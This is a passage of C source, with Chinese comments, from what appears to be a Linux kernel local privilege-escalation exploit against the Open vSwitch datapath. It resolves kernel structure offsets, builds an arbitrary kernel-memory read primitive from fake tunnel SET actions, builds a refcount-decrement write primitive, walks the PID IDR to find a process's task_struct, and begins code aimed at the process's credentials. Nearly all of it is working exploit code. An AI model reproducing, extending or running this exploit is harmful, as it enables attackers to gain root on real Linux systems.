    if (!g_krec_hit.lane_count) {        /* 没写 lanes 就按默认全量顺序 */
        for (i = 0; i < KREC_NLANES; i++)
            g_krec_hit.lane_order[i] = i;
        g_krec_hit.lane_count = KREC_NLANES;
    }
    return 0;
}

/* 主版本号：5.8.0-59-generic -> "5" */
static int th_major(const char *release, char *out, size_t outsz)
{
    size_t n = 0;

    while (isdigit((unsigned char)release[n]))
        n++;
    if (!n || n + 1 > outsz)
        return -1;
    memcpy(out, release, n);
    out[n] = 0;
    return 0;
}

static int th_probe(const char *root, const char *major, const char *release,
                    char *out, size_t outsz)
{
    snprintf(out, outsz, "%s/%s系/%s/target.h", root, major, release);
    if (access(out, R_OK) == 0)
        return 0;
    snprintf(out, outsz, "%s/%s/target.h", root, release);   /* 平铺也认 */
    if (access(out, R_OK) == 0)
        return 0;
    return -1;
}

/* 精确目录没有时，在 <root>/<N>系 下找名字前缀最接近的一个 */
static int th_probe_fuzzy(const char *root, const char *major,
                          const char *release, char *out, size_t outsz)
{
    char dir[512], best[256] = "";
    DIR *d;
    struct dirent *e;
    size_t rlen = strlen(release);
    size_t blen = 0;

    snprintf(dir, sizeof(dir), "%s/%s系", root, major);
    d = opendir(dir);
    if (!d)
        return -1;

    while ((e = readdir(d)) != NULL) {
        size_t n;

        if (e->d_name[0] == '.')
            continue;
        n = strlen(e->d_name);
        if (n >= rlen ? strncmp(e->d_name, release, rlen)
                      : strncmp(release, e->d_name, n))
            continue;
        if (n > blen) {                  /* 取重叠最长的 */
            blen = n;
            snprintf(best, sizeof(best), "%s", e->d_name);
        }
    }
    closedir(d);

    if (!best[0])
        return -1;
    snprintf(out, outsz, "%s/%s系/%s/target.h", root, major, best);
    return access(out, R_OK) == 0 ? 0 : -1;
}

/* 列出 <root>/<N>系 下已有的目录，用于「本机没配置表」时提示 */
/* 优先列同一个 X.Y 系列的，否则列整个大版本的前几个 */
static void th_list_series(const char *root, const char *major, const char *want)
{
    char dir[512], pref[32];
    char same[4][256], other[4][256];
    DIR *d;
    struct dirent *e;
    int nsame = 0, nother = 0, total = 0, plen = 0;
    const char *dot;

    /* want 形如 6.6.117-... -> pref = "6.6" */
    dot = strchr(want, '.');
    if (dot && (dot = strchr(dot + 1, '.')) != NULL) {
        plen = (int)(dot - want);
        if (plen >= (int)sizeof(pref))
            plen = 0;
        else
            memcpy(pref, want, (size_t)plen), pref[plen] = 0;
    }

    snprintf(dir, sizeof(dir), "%s/%s系", root, major);
    d = opendir(dir);
    if (!d)
        return;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.')
            continue;
        total++;
        if (plen && !strncmp(e->d_name, pref, (size_t)plen) &&
            e->d_name[plen] == '.') {
            if (nsame < 4)
                snprintf(same[nsame], sizeof(same[0]), "%s", e->d_name);
            nsame++;
        } else if (nother < 4) {
            snprintf(other[nother], sizeof(other[0]), "%s", e->d_name);
            nother++;
        }
    }
    closedir(d);

    if (!total) {
        pr_dim("    该系列还没有任何表\n");
        return;
    }
    if (nsame) {
        int i, shown = nsame < 4 ? nsame : 4;

        pr_dim("    %s.* 有 %d 个：", pref, nsame);
        for (i = 0; i < shown; i++)
            pr_raw("%s%s", i ? "、" : "", same[i]);
        pr_raw("%s\n", nsame > shown ? " …\n" : "\n");
        return;
    }
    pr_dim("    %s系 共 %d 个，例如：", major, total);
    pr_raw("%s%s", other[0], nother > 1 ? "、" : "");
    if (nother > 1)
        pr_raw("%s", other[1]);
    pr_raw("%s\n", nother > 2 ? " …\n" : "\n");
}

static int th_resolve(struct koffs *k)
{
    const char *roots[8];
    char major[8], path[600], exeroot[600], rel[128];
    struct utsname u;
    int nr = 0, i;

    if (g_force_derive) {
        pr_dim("  配置表：-force-derive 指定跳过\n");
        return -1;
    }
    if (uname(&u) != 0)
        return -1;
    {
        const char *want = g_krec_force ? g_krec_force : u.release;

        if (th_major(want, major, sizeof(major)) != 0)
            return -1;
    }

    if (g_offset_dir)
        roots[nr++] = g_offset_dir;
    {
        const char *e = getenv("OVSWRAP_OFFSET_DIR");

        if (e && *e)
            roots[nr++] = e;
    }
    {
        char exe[512];
        ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);

        if (n > 0) {
            char *sl;

            exe[n] = 0;
            sl = strrchr(exe, '/');
            if (sl) {
                *sl = 0;
                snprintf(exeroot, sizeof(exeroot), "%s/offset", exe);
                roots[nr++] = exeroot;
            }
        }
    }
    roots[nr++] = "offset";                       /* 当前目录 */
    roots[nr++] = "/usr/share/dirtyfrag/offset";
    roots[nr++] = "/usr/local/share/dirtyfrag/offset";

    for (i = 0; i < nr; i++) {
        const char *want = g_krec_force ? g_krec_force : u.release;

        if (th_probe(roots[i], major, want, path, sizeof(path)) != 0 &&
            th_probe_fuzzy(roots[i], major, want, path, sizeof(path)) != 0)
            continue;
        if (th_load(path, k, rel, sizeof(rel)) != 0) {
            pr_err("  配置表 %s 解析失败（格式不对或字段不全）\n", path);
            continue;
        }

        snprintf(g_krec_src, sizeof(g_krec_src), "%s", path);
        snprintf(g_krec_hit.release, sizeof(g_krec_hit.release), "%s",
                 rel[0] ? rel : u.release);
        g_tun_info = g_krec_hit.tunnel_info;
        pr_ok("  配置表命中：%s\n", path);
        if (rel[0] && strcmp(rel, u.release))
            pr_dim("    表里的 release=%s，本机是 %s，属于借用。\n",
                   rel, u.release);
        else if (!g_krec_hit.exact)
            pr_dim("    同 release、build 串不同（或表里没写 KREC_VERSION）；\n"
                   "    自检对不上就 -force-derive。\n");
        return 0;
    }

    {
        const char *want = g_krec_force ? g_krec_force : u.release;

        pr_dim("  配置表：%s系 下没有 %s 的 target.h，回退到内嵌表\n",
               major, want);
        for (i = 0; i < nr; i++) {
            char dir[512];

            snprintf(dir, sizeof(dir), "%s/%s系", roots[i], major);
            if (access(dir, R_OK) != 0)
                continue;
            pr_dim("    配置根在 %s，补一张即可：\n", roots[i]);
            pr_dim("      mkdir -p %s/%s系/%s && \\\n"
                   "      ./ovswrap -dump-target > %s/%s系/%s/target.h\n",
                   roots[i], major, want, roots[i], major, want);
            th_list_series(roots[i], major, want);
            return -1;
        }
    }
    pr_dim("    还没有 offset/ 目录。建一个放 target.h 就行，例如：\n");
    pr_dim("      mkdir -p offset/%s系/%s && \\\n"
           "      ./ovswrap -dump-target > offset/%s系/%s/target.h\n",
           major, u.release, major, u.release);
    return -1;
}

/* 命中返回 0 并填好 k / g_krec_hit / g_tun_info；未收录返回 -1 */
static int krec_resolve(struct koffs *k)
{
    struct utsname u;
    const unsigned char *rec;
    const char *want;
    int idx, exact = 0;

    memset(&g_krec_hit, 0, sizeof(g_krec_hit));
    g_krec_src[0] = 0;

    /* 1. offset/<N>系/<release>/target.h */
    if (th_resolve(k) == 0) {
        pr_dim("    module_ktype=0x%lx init_pid_ns=0x%lx ref=%s\n"
               "    read=%s write=%s tunnel_info=%d lanes=%d\n",
               k->vmlinux_module_ktype, k->vmlinux_init_pid_ns,
               k->ref_kind ? "__refcnt" : "__rcuref",
               g_krec_hit.read_carrier == CARRIER_TIMEOUT ? "timeout"
                                                          : "labels-only",
               g_krec_hit.write_carrier == CARRIER_TIMEOUT ? "timeout"
                                                           : "labels-only",
               g_krec_hit.tunnel_info, g_krec_hit.lane_count);
        return 0;
    }

    if (g_force_derive)
        return -1;

    /* 2. 内嵌的 808 条存量表 */
    if (krec_load(&g_krec) != 0) {
        pr_dim("  预置表：内置数据解析失败，回退到动态推导\n");
        return -1;
    }
    if (uname(&u) != 0)
        return -1;

    want = g_krec_force ? g_krec_force : u.release;
    idx = krec_lookup(&g_krec, want, g_krec_force ? 0UL : fnv1a32(u.version),
                      &exact);
    if (idx < 0) {
        pr_dim("  预置表：%u 条记录里没有 release=%s，回退到动态推导\n",
               g_krec.n_rec, want);
        krec_hint(&g_krec, want);
        return -1;
    }

    rec = g_krec.rec_tab + (size_t)idx * KREC_REC_STRIDE;
    krec_apply_offsets(&g_krec, krec_u16(rec + 8), k);
    krec_apply_combo(&g_krec, rec[10]);

    g_krec_hit.hit = 1;
    g_krec_hit.exact = exact;
    snprintf(g_krec_hit.release, sizeof(g_krec_hit.release), "%s", want);
    snprintf(g_krec_src, sizeof(g_krec_src), "内嵌表（%u 条）", g_krec.n_rec);
    g_tun_info = g_krec_hit.tunnel_info;

    if (g_krec_force && !exact) {
        pr_ok("  预置表：按 -krec %s 强制指定（本机 release=%s）\n",
              want, u.release);
        pr_dim("    偏移来自那条记录，自检对不上就说明布局不同。\n");
    } else if (exact) {
        pr_ok("  预置表命中：%s（release + build 完全一致，表内 %u 条）\n",
              want, g_krec.n_rec);
    } else {
        pr_ok("  预置表命中：%s（同 release、build 串不同，表内 %u 条）\n",
              want, g_krec.n_rec);
        pr_dim("    同一 release 的不同构建布局一般相同；若自检对不上，\n"
               "    说明这个构建改过结构体，用 -force-derive 走动态推导。\n");
    }
    pr_dim("    read=%s write=%s tunnel_info=%d lanes=%d "
           "module_ktype=0x%lx init_pid_ns=0x%lx\n",
           g_krec_hit.read_carrier == CARRIER_TIMEOUT ? "timeout" : "labels-only",
           g_krec_hit.write_carrier == CARRIER_TIMEOUT ? "timeout" : "labels-only",
           g_krec_hit.tunnel_info, g_krec_hit.lane_count,
           k->vmlinux_module_ktype, k->vmlinux_init_pid_ns);
    return 0;
}

static int derive_offsets(struct koffs *k)
{
    int mkobj, kobj, ktype, size, key_off;

    memset(k, 0, sizeof(*k));

    if (krec_resolve(k) == 0)
        return 0;

    if (derive_symbols(k) != 0) {
        pr_err("  拿不到 _text / module_ktype / init_pid_ns 的地址。\n");
        pr_dim("    普通用户下 /proc/kallsyms 的地址会被 kptr_restrict 清零；\n"
               "    需要 /boot/System.map-$(uname -r)，或者以 root 运行一次。\n");
        return -1;
    }
    pr_dim("  module_ktype 偏移 = 0x%lx, init_pid_ns 偏移 = 0x%lx\n",
           k->vmlinux_module_ktype, k->vmlinux_init_pid_ns);

    if (koff_field("nf_conntrack_helper", "me", &k->nf_conntrack_helper_me))
        return -1;
    if (koff_field("module", "mkobj", &mkobj))
        return -1;
    if (koff_field("module_kobject", "kobj", &kobj))
        return -1;
    if (koff_field("kobject", "ktype", &ktype))
        return -1;
    k->module_kobj_ktype = mkobj + kobj + ktype;

    if (koff_field("ovs_conntrack_info", "labels", &k->ovs_ct_labels))
        return -1;
    if (koff_struct_size("ovs_conntrack_info", &size))
        return -1;
    k->ovs_ct_action_len = NLA_HDR_LEN + size;

    if (koff_field("ip_tunnel_info", "key", &key_off))
        return -1;
    if (koff_field("ip_tunnel_key", "src", &size))
        return -1;
    k->ip_tunnel_key_ipv4_src = key_off + size;
    if (koff_field("ip_tunnel_key", "dst", &size))
        return -1;
    k->ip_tunnel_key_ipv4_dst = key_off + size;
    if (koff_field("ip_tunnel_key", "tos", &size))
        return -1;
    k->ip_tunnel_key_tos = key_off + size;
    if (koff_field("ip_tunnel_key", "ttl", &size))
        return -1;
    k->ip_tunnel_key_ttl = key_off + size;
    if (koff_field("ip_tunnel_key", "tp_src", &size))
        return -1;
    k->ip_tunnel_key_tp_src = key_off + size;
    if (koff_field("ip_tunnel_key", "tp_dst", &size))
        return -1;
    k->ip_tunnel_key_tp_dst = key_off + size;

    if (koff_field("dst_entry", "__rcuref", &k->dst_entry_ref) == 0) {
        k->ref_kind = 0;
    } else if (koff_field("dst_entry", "__refcnt", &k->dst_entry_ref) == 0) {
        k->ref_kind = 1;
    } else {
        pr_err("  dst_entry 里既没有 __rcuref 也没有 __refcnt\n");
        return -1;
    }

    if (koff_field("task_struct", "pid", &k->task_pid) ||
        koff_field("task_struct", "cred", &k->task_cred) ||
        koff_field("task_struct", "pid_links", &k->task_pid_links) ||
        koff_field("cred", "fsuid", &k->cred_fsuid) ||
        koff_field("cred", "fsgid", &k->cred_fsgid) ||
        koff_field("cred", "cap_permitted", &k->cred_cap_permitted) ||
        koff_field("cred", "cap_effective", &k->cred_cap_effective) ||
        koff_field("pid_namespace", "idr", &k->pid_namespace_idr) ||
        koff_field("idr", "idr_rt", &k->idr_idr_rt) ||
        koff_field("idr", "idr_base", &k->idr_base) ||
        koff_field("xarray", "xa_head", &k->xarray_xa_head) ||
        koff_field("xa_node", "shift", &k->xa_node_shift) ||
        koff_field("xa_node", "slots", &k->xa_node_slots) ||
        koff_field("pid", "tasks", &k->pid_tasks) ||
        koff_field("hlist_head", "first", &k->hlist_head_first) ||
        koff_field("metadata_dst", "u", &k->metadata_dst_tun_info))
        return -1;

    return 0;
}

/* -------------------------------------------------------------------------
 * OVS datapath / flow
 * ---------------------------------------------------------------------- */

struct ovs_header {
    int32_t dp_ifindex;
};

static int ovs_create_datapath(struct genl *g, int family, const char *name)
{
    struct buf p;
    uint32_t zero = 0;
    int ret;

    buf_init(&p, 128);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, 0);                                  /* ovs_header.dp_ifindex */
    nla_put(&p, OVS_DP_ATTR_NAME, name, strlen(name) + 1);
    nla_put(&p, OVS_DP_ATTR_UPCALL_PID, &zero, 4);
    nla_put(&p, OVS_DP_ATTR_USER_FEATURES, &zero, 4);

    ret = genl_xchg(g, family, OVS_DP_CMD_NEW, OVS_DATAPATH_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_create_flow(struct genl *g, int family, int ifindex,
                           const struct buf *key, const struct buf *actions)
{
    struct buf p;
    int ret;

    buf_init(&p, key->len + actions->len + 64);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);
    nla_put(&p, OVS_FLOW_ATTR_ACTIONS, actions->p, actions->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_NEW, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_delete_flow(struct genl *g, int family, int ifindex,
                           const struct buf *key)
{
    struct buf p;
    int ret;

    buf_init(&p, key->len + 64);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_DEL, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_get_actions(struct genl *g, int family, int ifindex,
                           const struct buf *key, struct buf *out)
{
    struct buf p, reply;
    int ret;
    size_t off;
    int found = 0;

    buf_init(&p, key->len + 64);
    buf_init(&reply, 8192);
    if (!p.p || !reply.p) {
        buf_free(&p);
        buf_free(&reply);
        return -ENOMEM;
    }
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_GET, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST, &reply);
    buf_free(&p);
    if (ret < 0) {
        buf_free(&reply);
        return ret;
    }

    /* reply = genlmsghdr(4) + ovs_header(4) + attrs */
    off = 8;
    while (off + 4 <= reply.len) {
        uint16_t alen, atype;

        memcpy(&alen, reply.p + off, 2);
        memcpy(&atype, reply.p + off + 2, 2);
        if (alen < 4 || off + alen > reply.len)
            break;
        if (atype == OVS_FLOW_ATTR_ACTIONS) {
            out->len = 0;
            buf_put(out, reply.p + off + 4, alen - 4);
            found = 1;
            break;
        }
        off += (alen + 3) & ~3u;
    }
    buf_free(&reply);
    return found ? 0 : -ENODATA;
}

/* attribute 迭代器 */
struct attr {
    uint16_t type;
    const unsigned char *payload;
    size_t len;
    size_t raw_len;
};

static int attr_next(const unsigned char *p, size_t total, size_t *off,
                     struct attr *a)
{
    uint16_t alen, atype;

    if (*off + 4 > total)
        return -1;
    memcpy(&alen, p + *off, 2);
    memcpy(&atype, p + *off + 2, 2);
    if (alen < 4 || *off + alen > total)
        return -1;
    a->type = atype;
    a->payload = p + *off + 4;
    a->len = alen - 4;
    a->raw_len = alen;
    *off += (alen + 3) & ~3u;
    return 0;
}

/* -------------------------------------------------------------------------
 * 读原语
 * ---------------------------------------------------------------------- */

struct lane {
    const char *name;
    int field_off;
    uint16_t attr;
    int idx;
    int optional_zero;
};

#define N_LANES 14

static void build_lanes(const struct koffs *k, struct lane *lanes)
{
    struct lane def[N_LANES];
    int used[N_LANES];
    int i, n = 0, out = 0;

    def[n++] = (struct lane){ "tos", k->ip_tunnel_key_tos,
                              OVS_TUNNEL_KEY_ATTR_TOS, 0, 1 };
    def[n++] = (struct lane){ "ttl", k->ip_tunnel_key_ttl,
                              OVS_TUNNEL_KEY_ATTR_TTL, 0, 0 };
    def[n++] = (struct lane){ "tp_src_0", k->ip_tunnel_key_tp_src,
                              OVS_TUNNEL_KEY_ATTR_TP_SRC, 0, 1 };
    def[n++] = (struct lane){ "tp_src_1", k->ip_tunnel_key_tp_src + 1,
                              OVS_TUNNEL_KEY_ATTR_TP_SRC, 1, 1 };
    def[n++] = (struct lane){ "tp_dst_0", k->ip_tunnel_key_tp_dst,
                              OVS_TUNNEL_KEY_ATTR_TP_DST, 0, 1 };
    def[n++] = (struct lane){ "tp_dst_1", k->ip_tunnel_key_tp_dst + 1,
                              OVS_TUNNEL_KEY_ATTR_TP_DST, 1, 1 };
    for (i = 0; i < 4; i++)
        def[n++] = (struct lane){ "ipv4_src", k->ip_tunnel_key_ipv4_src + i,
                                  OVS_TUNNEL_KEY_ATTR_IPV4_SRC, i, 1 };
    for (i = 0; i < 4; i++)
        def[n++] = (struct lane){ "ipv4_dst", k->ip_tunnel_key_ipv4_dst + i,
                                  OVS_TUNNEL_KEY_ATTR_IPV4_DST, i, 1 };

    /*
     * 预置表里每条记录都记了「这个内核的 fake SET 实际会回填哪些
     * tunnel key」。命中的内核按它的顺序先试，剩下的排在后面。
     */
    memset(used, 0, sizeof(used));
    if (g_krec_hit.hit) {
        for (i = 0; i < g_krec_hit.lane_count; i++) {
            int id = g_krec_hit.lane_order[i];

            if (id < 0 || id >= N_LANES || used[id])
                continue;
            used[id] = 1;
            lanes[out++] = def[id];
        }
    }
    for (i = 0; i < n; i++)
        if (!used[i])
            lanes[out++] = def[i];
}

struct reader {
    struct genl *g;
    int flow_family;
    int dp_ifindex;
    const struct koffs *k;
    struct lane lanes[N_LANES];
    int seq;
    int carrier_mode;        /* CARRIER_AUTO / TIMEOUT / LABELS_ONLY */
    int timeout_disabled;
    int ct_action_len;
    int labels_off;
};

struct writer {
    struct genl *g;
    int flow_family;
    int dp_ifindex;
    const struct koffs *k;
    int seq;
    int carrier_mode;
    int timeout_disabled;
    int ct_action_len;
    int labels_off;
};

static int fake_set_error(int ret)
{
    /* EINVAL：内核不认这个 carrier；ENODATA：flow get 没回 actions */
    return ret == -EINVAL || ret == -ENODATA;
}

/* 选中 carrier 列表；auto 模式先试 timeout，失败后退到 labels-only */
static int carrier_candidates(struct reader *r, int *out)
{
    int n = 0;

    if (r->carrier_mode == CARRIER_TIMEOUT) {
        out[n++] = CARRIER_TIMEOUT;
    } else if (r->carrier_mode == CARRIER_LABELS_ONLY) {
        out[n++] = CARRIER_LABELS_ONLY;
    } else if (r->timeout_disabled) {
        out[n++] = CARRIER_LABELS_ONLY;
    } else {
        out[n++] = CARRIER_TIMEOUT;
        out[n++] = CARRIER_LABELS_ONLY;
    }
    return n;
}

/*
 * 读一个字节。
 * 原理：把 tun_dst 设成 (addr - field_off - metadata_dst.u)，
 * fake SET 里的 TUNNEL_INFO 就会把 ip_tunnel_info 放在我们指定的位置。
 * flow get 回显 tunnel key 时，对应字段就是从 addr 读到的那一字节。
 */
static int read_u8_lane(struct reader *r, uint64_t addr, const struct lane *ln,
                        int *out)
{
    struct buf key, actions, dumped;
    int carriers[2];
    int nc, i;
    int ret = -ENODATA;
    uint64_t tun_dst;

    tun_dst = addr - (uint64_t)ln->field_off - (uint64_t)r->k->metadata_dst_tun_info;

    nc = carrier_candidates(r, carriers);
    for (i = 0; i < nc; i++) {
        int carrier = carriers[i];

        buf_init(&key, 256);
        buf_init(&actions, 32768);
        buf_init(&dumped, 65536);
        if (!key.p || !actions.p || !dumped.p) {
            buf_free(&key); buf_free(&actions); buf_free(&dumped);
            return -ENOMEM;
        }

        flow_key(&key, ++r->seq);
        clone_with_fake_set(&actions, carrier, tun_dst,
                            r->ct_action_len, r->labels_off);

        ret = ovs_create_flow(r->g, r->flow_family, r->dp_ifindex, &key, &actions);
        if (ret == 0)
            ret = ovs_get_actions(r->g, r->flow_family, r->dp_ifindex,
                                  &key, &dumped);
        ovs_delete_flow(r->g, r->flow_family, r->dp_ifindex, &key);

        buf_free(&key);
        buf_free(&actions);

        if (ret != 0) {
            buf_free(&dumped);
            if (fake_set_error(ret) && i + 1 < nc) {
                if (!r->timeout_disabled && r->carrier_mode == CARRIER_AUTO) {
                    pr_dim("    fake SET timeout 载体不被接受，改用 labels-only\n");
                    r->timeout_disabled = 1;
                }
                continue;
            }
            return ret;
        }

        /* 解析回显的 actions */
        {
            size_t off = 0;
            struct attr top;

            while (attr_next(dumped.p, dumped.len, &off, &top) == 0) {
                size_t toff = 0;
                struct attr tkey;

                if (top.type != OVS_ACTION_ATTR_SET)
                    continue;

                while (attr_next(top.payload, top.len, &toff, &tkey) == 0) {
                    size_t koff = 0;
                    struct attr ta;
                    int saw = 0;

                    if (tkey.type != OVS_KEY_ATTR_TUNNEL)
                        continue;

                    while (attr_next(tkey.payload, tkey.len, &koff, &ta) == 0) {
                        if (ta.type == OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE) {
                            buf_free(&dumped);
                            return -ENODATA;
                        }
                        saw = 1;
                        if (ta.type == (uint16_t)ln->attr) {
                            if ((int)ta.len <= ln->idx) {
                                buf_free(&dumped);
                                return -EPROTO;
                            }
                            *out = ta.payload[ln->idx];
                            buf_free(&dumped);
                            return 0;
                        }
                    }
                    if (saw && ln->optional_zero) {
                        *out = 0;
                        buf_free(&dumped);
                        return 0;
                    }
                }
            }
        }
        buf_free(&dumped);
        return -ENODATA;
    }
    return ret;
}

static int ovs_read_u8(struct reader *r, uint64_t addr, int *out)
{
    int i;

    for (i = 0; i < N_LANES; i++) {
        int v = 0;

        if (read_u8_lane(r, addr, &r->lanes[i], &v) == 0) {
            *out = v;
            return 0;
        }
    }
    return -ENODATA;
}

static int ovs_read_bytes(struct reader *r, uint64_t addr, unsigned char *out,
                          size_t n)
{
    size_t i;

    for (i = 0; i < n; i++) {
        int v = 0;

        if (ovs_read_u8(r, addr + i, &v) != 0)
            return -1;
        out[i] = (unsigned char)v;
    }
    return 0;
}

static int ovs_read_u32(struct reader *r, uint64_t addr, uint32_t *out)
{
    unsigned char b[4];

    if (ovs_read_bytes(r, addr, b, 4) != 0)
        return -1;
    memcpy(out, b, 4);
    return 0;
}

static int ovs_read_u64(struct reader *r, uint64_t addr, uint64_t *out)
{
    unsigned char b[8];

    if (ovs_read_bytes(r, addr, b, 8) != 0)
        return -1;
    memcpy(out, b, 8);
    return 0;
}

/* -------------------------------------------------------------------------
 * 写原语：dst_release() 每次 -1
 * ---------------------------------------------------------------------- */

static int decrement_once(struct writer *w, uint64_t addr)
{
    struct buf key, actions;
    int nc, i;
    int ret = -EINVAL;
    uint64_t tun_dst = addr - (uint64_t)w->k->dst_entry_ref;

    nc = (w->carrier_mode == CARRIER_LABELS_ONLY) ? 1
       : (w->carrier_mode == CARRIER_TIMEOUT) ? 1 : 2;

    for (i = 0; i < nc; i++) {
        int carrier;

        if (w->carrier_mode == CARRIER_AUTO)
            carrier = (i == 0) ? CARRIER_TIMEOUT : CARRIER_LABELS_ONLY;
        else
            carrier = w->carrier_mode;

        buf_init(&key, 256);
        buf_init(&actions, 32768);
        if (!key.p || !actions.p) {
            buf_free(&key);
            buf_free(&actions);
            return -ENOMEM;
        }

        flow_key(&key, ++w->seq);
        clone_with_fake_set(&actions, carrier, tun_dst,
                            w->ct_action_len, w->labels_off);

        ret = ovs_create_flow(w->g, w->flow_family, w->dp_ifindex, &key, &actions);
        if (ret == 0) {
            ret = ovs_delete_flow(w->g, w->flow_family, w->dp_ifindex, &key);
            buf_free(&key);
            buf_free(&actions);
            return ret;
        }
        ovs_delete_flow(w->g, w->flow_family, w->dp_ifindex, &key);
        buf_free(&key);
        buf_free(&actions);

        if (ret == -ENOMEM) {
            pr_err("    内存不足：建议重启后重试，或给虚拟机 2GB 以上内存\n");
            return ret;
        }
        if (fake_set_error(ret) && i + 1 < nc)
            continue;
        if (fake_set_error(ret))
            return ret;
        return ret;
    }
    return ret;
}

/* -------------------------------------------------------------------------
 * 指针 / XArray
 * ---------------------------------------------------------------------- */

static uint64_t canonicalize(uint64_t v)
{
    if (v >= 0xFFFF800000000000ULL)
        return v;
    if (v >= 0x0000008000000000ULL && v <= 0x000000FFFFFFFFFFULL)
        return v | 0xFFFFFF0000000000ULL;
    if (v >= 0x0000800000000000ULL && v <= 0x0000FFFFFFFFFFFFULL)
        return v | 0xFFFF000000000000ULL;
    if (v >= 0x0080000000000000ULL && v <= 0x00FFFFFFFFFFFFFFULL)
        return v | 0xFF00000000000000ULL;
    return v;
}

static int is_kernel_ptr(uint64_t v)
{
    uint64_t c = canonicalize(v);

    return c >= 0xFF00000000000000ULL && c <= 0xFFFFFFFFFFFFFFFFULL &&
           (c & 7) == 0;
}

static int read_kptr(struct reader *r, uint64_t addr, const char *label,
                     uint64_t *out)
{
    uint64_t v = 0;

    if (ovs_read_u64(r, addr, &v) != 0) {
        pr_err("  读 %s @0x%llx 失败\n", label, (unsigned long long)addr);
        return -1;
    }
    v = canonicalize(v);
    if (!is_kernel_ptr(v)) {
        pr_err("  %s @0x%llx 不是内核指针: 0x%llx\n", label,
               (unsigned long long)addr, (unsigned long long)v);
        return -1;
    }
    *out = v;
    return 0;
}

static int xarray_entry_to_node(uint64_t e, uint64_t *out)
{
    if (e == 0 || (e & 3) != 2)
        return 0;
    e = canonicalize(e & ~3ULL);
    if (!is_kernel_ptr(e))
        return 0;
    *out = e;
    return 1;
}

static int xarray_entry_to_ptr(uint64_t e, uint64_t *out)
{
    if (e == 0 || (e & 3) != 0)
        return 0;
    e = canonicalize(e);
    if (!is_kernel_ptr(e))
        return 0;
    *out = e;
    return 1;
}

static int read_xarray_entry(struct reader *r, uint64_t addr, const char *label,
                             uint64_t *out)
{
    uint64_t v = 0, p = 0;

    if (ovs_read_u64(r, addr, &v) != 0)
        return -1;
    if (xarray_entry_to_node(v, &p)) {
        *out = p | 2;
        return 0;
    }
    if (xarray_entry_to_ptr(v, &p)) {
        *out = p;
        return 0;
    }
    pr_err("  %s @0x%llx 不是合法 XArray 项: 0x%llx\n", label,
           (unsigned long long)addr, (unsigned long long)v);
    return -1;
}

static int lookup_init_pid_ns_pid(struct reader *r, uint64_t kernel_base,
                                  int pid_nr, uint64_t *out)
{
    const struct koffs *k = r->k;
    uint64_t idr_addr = kernel_base + k->vmlinux_init_pid_ns + k->pid_namespace_idr;
    uint32_t idr_base = 0;
    uint64_t xarray_addr, entry;
    unsigned long index;
    int depth;

    if (ovs_read_u32(r, idr_addr + k->idr_base, &idr_base) != 0)
        return -1;
    if ((uint32_t)pid_nr < idr_base) {
        pr_err("  pid %d 小于 init_pid_ns.idr_base %u\n", pid_nr, idr_base);
        return -1;
    }
    index = (unsigned long)((uint32_t)pid_nr - idr_base);
    xarray_addr = idr_addr + k->idr_idr_rt;

    if (read_xarray_entry(r, xarray_addr + k->xarray_xa_head,
                          "init_pid_ns.idr.xa_head", &entry) != 0)
        return -1;

    for (depth = 0; depth < 8; depth++) {
        uint64_t node = 0, ptr = 0;

        if (xarray_entry_to_node(entry, &node)) {
            int shift = 0;
            unsigned slot;
            uint64_t slot_addr;

            if (ovs_read_u8(r, node + k->xa_node_shift, &shift) != 0)
                return -1;
            shift &= 0xff;
            if (shift > 60 || shift % 6 != 0) {
                pr_err("  xa_node.shift 异常: %u\n", shift);
                return -1;
            }
            slot = (unsigned)((index >> shift) & 0x3F);
            slot_addr = node + k->xa_node_slots + (uint64_t)slot * 8;
            if (read_xarray_entry(r, slot_addr, "idr slot", &entry) != 0)
                return -1;
            continue;
        }
        if (xarray_entry_to_ptr(entry, &ptr)) {
            *out = ptr;
            return 0;
        }
        break;
    }
    pr_err("  init_pid_ns idr 遍历超过深度限制（pid %d）\n", pid_nr);
    return -1;
}

static int locate_task(struct reader *r, uint64_t kernel_base, int wanted_pid,
                       uint64_t *out)
{
    const struct koffs *k = r->k;
    uint64_t pid_struct = 0, first = 0, task = 0;
    uint32_t pid = 0;

    if (lookup_init_pid_ns_pid(r, kernel_base, wanted_pid, &pid_struct) != 0)
        return -1;

    if (read_kptr(r, pid_struct + k->pid_tasks + k->hlist_head_first,
                  "pid.tasks.first", &first) != 0)
        return -1;

    task = first - (uint64_t)k->task_pid_links;
    if (!is_kernel_ptr(task)) {
        pr_err("  hlist 指出的 task 非法: 0x%llx\n", (unsigned long long)task);
        return -1;
    }
    if (ovs_read_u32(r, task + k->task_pid, &pid) != 0)
        return -1;
    if ((int)pid != wanted_pid) {
        pr_err("  task.pid=%u，期望 %d\n", pid, wanted_pid);
        return -1;
    }
    pr_dim("  pid_struct=0x%llx task=0x%llx\n",
           (unsigned long long)pid_struct, (unsigned long long)task);
    *out = task;
    return 0;
}

/* -------------------------------------------------------------------------
 * 改 writer 的 cred
 * ---------------------------------------------------------------------- */

static int decrement_to_zero(struct reader *r, struct writer *w, uint64_t addr,
                             const char *label)
{
    uint32_t v = 0, now = 0;
    uint32_t i;

    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
